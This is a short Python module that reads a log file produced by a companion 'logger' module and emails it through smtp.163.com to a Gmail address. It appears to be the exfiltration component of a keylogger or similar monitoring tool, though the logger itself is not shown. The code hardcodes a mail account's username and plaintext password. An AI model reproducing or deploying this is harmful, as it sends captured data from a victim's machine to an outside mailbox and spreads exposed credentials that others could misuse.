import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from .logger import FILENAME
from .logger import FULL_PATH # import logger


def send_log():
    smtp_server = 'smtp.163.com'
    smtp_port = 25
    smtp_username = 'zw0432751551@163.com'
    smtp_password = 'HTBGKRUUQOBFDEBL'
    smtp_connection = smtplib.SMTP(smtp_server, smtp_port)
    smtp_connection.login(smtp_username, smtp_password)

    log_file_path = FULL_PATH
    
    with open(log_file_path, 'rb') as file:
        log_file_data = file.read()

    message = MIMEText(log_file_data)

    message['From'] = 'zw0432751551@163.com'
    message['To'] = 'zw0432751551@gmail.com'
    message['Subject'] = 'Log file'

    smtp_connection.sendmail(smtp_username, 'zw0432751551@gmail.com', message.as_string())
    smtp_connection.quit()
    print ("Email sent successfully")